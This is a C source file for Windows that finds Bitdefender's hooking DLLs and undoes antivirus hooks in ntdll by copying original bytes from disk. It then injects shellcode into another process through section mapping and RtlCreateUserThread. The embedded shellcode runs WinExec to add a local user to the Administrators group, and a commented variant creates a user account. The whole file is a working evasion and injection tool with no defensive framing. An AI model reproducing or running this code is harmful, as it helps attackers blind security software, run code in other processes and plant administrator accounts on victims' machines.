#include <stdio.h>
#include <libloaderapi.h>
#include <processthreadsapi.h>
#include <winternl.h>
#include <windows.h>


HMODULE myGetModuleHandle(PWSTR search) {

    // obtaining the offset of PPEB from the beginning of TEB
    PEB* pPeb = (PEB*)__readgsqword(0x60);

    // for x86
    // PEB* pPeb = (PEB*)__readgsqword(0x30);

    // Get PEB
    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

    // Start iterating
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

    // iterating through the linked list.
    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {

        // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
        //printf("%S : %p\n",pEntry->FullDllName.Buffer,(HMODULE)pEntry->DllBase);

        if(!wcscmp(pEntry->FullDllName.Buffer,search)){
            return (HMODULE)pEntry->DllBase;
        }
    }

    // the needed DLL wasn't found
    return NULL;
}

int hookChecker(const wchar_t* libPath, const wchar_t* lib, const char* funToCheck) {

    HANDLE dllFile = CreateFileW(libPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dllFileSize = GetFileSize(dllFile, NULL);
    HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(dllFile);

    // analyze the dll
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

    // find the original function code
    PVOID pNtCreateThreadExOriginal = NULL;
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, funToCheck))
        {
            pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
    // compare functions
    PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(lib), funToCheck);
    if (!memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16))
    {
        printf("clean\n");
        return 0;
    }

    printf("fixing hook\n");
    DWORD old_protection,temp_protection;
    VirtualProtect(pNtCreateThreadEx, 16, PAGE_EXECUTE_READWRITE,  &old_protection);
    memcpy(pNtCreateThreadEx,pNtCreateThreadExOriginal,16);
    VirtualProtect(pNtCreateThreadEx, 16, old_protection,  &old_protection);
    return 1;

}


void testHook(const wchar_t* lib, const char* fun) {
    PVOID pMessageBoxW = GetProcAddress(GetModuleHandleW(lib), fun);
    DWORD oldProtect;
    VirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    char hook[] = { 0x90 }; // ret
    memcpy(pMessageBoxW, hook, 1);
    VirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);
    MessageBoxW(NULL, L"Hooked", L"Hooked", 0); // won't show up if you hooked it

}

// NtCreateSection syntax
typedef NTSTATUS(NTAPI* pNtCreateSection)(
        OUT PHANDLE            SectionHandle,
        IN ULONG               DesiredAccess,
        IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
        IN PLARGE_INTEGER      MaximumSize OPTIONAL,
        IN ULONG               PageAttributess,
        IN ULONG               SectionAttributes,
        IN HANDLE              FileHandle OPTIONAL
);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
        HANDLE            SectionHandle,
        HANDLE            ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR         ZeroBits,
        SIZE_T            CommitSize,
        PLARGE_INTEGER    SectionOffset,
        PSIZE_T           ViewSize,
        DWORD             InheritDisposition,
        ULONG             AllocationType,
        ULONG             Win32Protect
);

// RtlCreateUserThread syntax
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
        IN HANDLE               ProcessHandle,
        IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
        IN BOOLEAN              CreateSuspended,
        IN ULONG                StackZeroBits,
        IN OUT PULONG           StackReserved,
        IN OUT PULONG           StackCommit,
        IN PVOID                StartAddress,
        IN PVOID                StartParameter OPTIONAL,
        OUT PHANDLE             ThreadHandle,
        OUT PCLIENT_ID          ClientID
);

// NtOpenProcess syntax
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
        PHANDLE                 ProcessHandle,
        ACCESS_MASK             AccessMask,
        POBJECT_ATTRIBUTES      ObjectAttributes,
        PCLIENT_ID              ClientID
);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
        HANDLE                 ProcessHandle,
        PVOID BaseAddress
);


int main() {
    printf("%p\n",GetModuleHandle("atcuf64.dll"));
    printf("%p\n",GetModuleHandle("bdhmk64.dll"));//HOOKED


    HANDLE bdhkm=myGetModuleHandle(L"C:\\Program Files\\Bitdefender\\Bitdefender Security\\bdhkm\\dlls_266184808945032704\\bdhkm64.dll");
    HANDLE hooking_engine=myGetModuleHandle(L"C:\\Program Files\\Bitdefender\\Bitdefender Security\\atcuf\\dlls_266481281005032704\\atcuf64.dll");
    printf("%p\n",bdhkm);
    printf("%p\n",hooking_engine);

    //printf("%d",FreeLibrary(hooking_engine));
    //testHook(L"ntdll.dll","NtCreateFile");
    printf("%d\n",hookChecker(L"C:\\Windows\\System32\\ntdll.dll",L"ntdll.dll","NtAllocateVirtualMemory"));
    printf("%d\n",hookChecker(L"C:\\Windows\\System32\\ntdll.dll",L"ntdll.dll","NtAllocateVirtualMemoryEx"));
    printf("%d\n",hookChecker(L"C:\\Windows\\System32\\ntdll.dll",L"ntdll.dll","NtQueueApcThread"));
    printf("%d\n",hookChecker(L"C:\\Windows\\System32\\ntdll.dll",L"ntdll.dll","ZwSetInformationProcess"));
    printf("%d\n",hookChecker(L"C:\\Windows\\System32\\ntdll.dll",L"ntdll.dll","ZwReadVirtualMemory"));

    unsigned char my_payload[] =
            //"\x48\x81\xc4\xf8\xfd\xff\xff\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\xad\x48\x96\x48\xad\x48\x8b\x58\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x4d\x31\xe4\x49\x81\xc4\xff\xff\x8f\x08\x49\xc1\xec\x14\x42\x8b\x14\x23\x4c\x01\xc2\x44\x8b\x52\x14\x44\x8b\x7a\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4c\x89\xd1\x67\xe3\x1c\x31\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x48\x39\x03\x75\xe1\x4d\x31\xdb\x44\x8b\x5a\x24\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x49\x89\xc6\x48\xb8\x77\x6f\x72\x64\x25\x20\x20\x20\x50\x48\xb8\x6c\x6c\x6f\x20\x50\x61\x73\x73\x50\x48\xb8\x20\x2f\x61\x64\x64\x20\x70\x6f\x50\x48\xb8\x6e\x65\x74\x20\x75\x73\x65\x72\x50\x48\x89\xe1\x48\xc7\xc2\x01\x00\x00\x00\x48\x83\xec\x20\x41\xff\xd6"
            "\x48\x81\xc4\xf8\xfd\xff\xff\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\xad\x48\x96\x48\xad\x48\x8b\x58\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x4d\x31\xe4\x49\x81\xc4\xff\xff\x8f\x08\x49\xc1\xec\x14\x42\x8b\x14\x23\x4c\x01\xc2\x44\x8b\x52\x14\x44\x8b\x7a\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4c\x89\xd1\x67\xe3\x1c\x31\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x48\x39\x03\x75\xe1\x4d\x31\xdb\x44\x8b\x5a\x24\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x49\x89\xc6\x48\xb8\x20\x20\x20\x20\x20\x20\x20\x20\x50\x48\xb8\x64\x64\x20\x70\x6f\x6c\x6c\x6f\x50\x48\xb8\x61\x74\x6f\x72\x73\x20\x2f\x61\x50\x48\xb8\x64\x6d\x69\x6e\x69\x73\x74\x72\x50\x48\xb8\x6c\x67\x72\x6f\x75\x70\x20\x41\x50\x48\xb8\x6e\x65\x74\x20\x6c\x6f\x63\x61\x50\x48\x89\xe1\x48\xc7\xc2\x01\x00\x00\x00\x48\x83\xec\x20\x41\xff\xd6";
    SIZE_T s = 4096;
    LARGE_INTEGER sectionS = { s };
    HANDLE sh = NULL; // section handle
    PVOID lb = NULL; // local buffer
    PVOID rb = NULL; // remote buffer
    HANDLE th = NULL; // thread handle
    DWORD pid; // process ID

    pid = 5176;//GetCurrentProcessId();

    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (PVOID)pid;
    cid.UniqueThread = 0;

    // loading ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll");

    pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
    pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress(ntdll, "NtCreateSection"));
    pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, "NtMapViewOfSection"));
    pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(ntdll, "RtlCreateUserThread"));
    pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, "ZwUnmapViewOfSection"));

    // create a memory section
    myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // bind the object in the memory of our process for reading and writing
    myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, 0, 0, NULL, &s, 2, 0, PAGE_READWRITE);

    // open remote proces via NT API
    HANDLE ph = NULL;
    myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);

    if (!ph) {
        printf("failed to open process :(\n");
        return -2;
    }

    // bind the object in the memory of the target process for reading and executing
    myNtMapViewOfSection(sh, ph, &rb, 0, 0, NULL, &s, 2, 0, PAGE_EXECUTE_READ);

    // write payload
    memcpy(lb, my_payload, sizeof(my_payload));

    // create a thread
    myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL);

    // and wait
    if (WaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
        return -2;
    }

    // clean up
    myZwUnmapViewOfSection(GetCurrentProcess(), lb);
    myZwUnmapViewOfSection(ph, rb);
    CloseHandle(sh);
    CloseHandle(ph);
    return 0;



}
